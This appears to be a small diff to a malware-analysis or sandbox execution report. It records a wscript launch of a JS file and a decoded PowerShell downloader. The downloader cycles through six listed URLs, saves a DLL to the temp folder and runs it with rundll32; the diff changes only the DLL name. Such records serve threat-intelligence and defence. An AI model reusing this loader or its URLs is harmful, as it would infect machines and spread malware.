@@ -12,7 +12,7 @@ Exec
 
 wscript.exe C:\Users\Admin\AppData\Local\Temp\Zeo.js
 
-powershell.exe -encodedcommand Start-Sleep -Seconds 3;$solsticesPhobies = ("https://awaisdanish.com/NnRU/wfvLyS9M,https://yellowhatglobal.com/G1RW/6DYwVZ,https://availablecleaner.com/whgio/Usy9c,https://ubmhaiti.org/thQ6L/4GTGQKkNarLy,https://engvida.com.br/rLm/IjFIPkaq,https://edsenezaluminum.com/OPG/c5oqQc50ES0").split(",");foreach ($HumidlyAlidads in $solsticesPhobies) {try {Invoke-WebRequest $HumidlyAlidads -TimeoutSec 15 -O $env:TEMP\walpoleanAfghanets.dll;if ((Get-Item $env:TEMP\walpoleanAfghanets.dll).length -ge 100000) {start rundll32 $env:TEMP\\walpoleanAfghanets.dll,GL70;break;}}catch {Start-Sleep -Seconds 3;}}
+powershell.exe -encodedcommand Start-Sleep -Seconds 3;$solsticesPhobies = ("https://awaisdanish.com/NnRU/wfvLyS9M,https://yellowhatglobal.com/G1RW/6DYwVZ,https://availablecleaner.com/whgio/Usy9c,https://ubmhaiti.org/thQ6L/4GTGQKkNarLy,https://engvida.com.br/rLm/IjFIPkaq,https://edsenezaluminum.com/OPG/c5oqQc50ES0").split(",");foreach ($HumidlyAlidads in $solsticesPhobies) {try {Invoke-WebRequest $HumidlyAlidads -TimeoutSec 15 -O $env:TEMP\walpoleanAfghanets.dll;if ((Get-Item $env:TEMP\walpoleanAfghanets.dll).length -ge 100000) {start rundll32 $env:TEMP\\diaphane.dll,GL70;break;}}catch {Start-Sleep -Seconds 3;}}
 
 *************************************************
 
